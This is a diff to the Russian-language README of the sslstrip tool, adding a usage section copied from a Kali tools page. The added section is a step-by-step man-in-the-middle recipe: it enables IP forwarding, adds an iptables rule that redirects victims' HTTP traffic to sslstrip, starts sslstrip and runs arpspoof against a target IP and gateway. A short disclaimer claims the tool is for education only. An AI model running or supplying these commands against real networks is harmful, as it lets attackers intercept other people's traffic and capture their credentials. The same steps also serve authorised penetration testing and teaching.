@@ -23,3 +23,18 @@ Ru:
 1. Рекомендуется использовать python 2.7.18 (установка на kali: https://www.kali.org/docs/general-use/using-eol-python-versions/)
 2. pip install -r requirements.txt
 3. python sslstrip.py
+
+Использование (взято: https://kali.tools/?p=177):
+1. Переключите вашу машину в режим пересылки (форвардинга).
+echo "1" > /proc/sys/net/ipv4/ip_forward
+
+2. Настройте iptables для редиректа HTTP трафика на sslstrip.
+iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port <listenPort>
+
+3. Запустите sslstrip.
+sslstrip.py -l <listenPort>
+
+4. Запустите arpspoof, чтобы убедить сети, что им следует отправлять их трафик вам.
+arpspoof -i <interface> -t <targetIP> <gatewayIP>
+  
+(Я не несу ответственности за ваши действия! Я за использование данного инструмента в образовательных целях!)
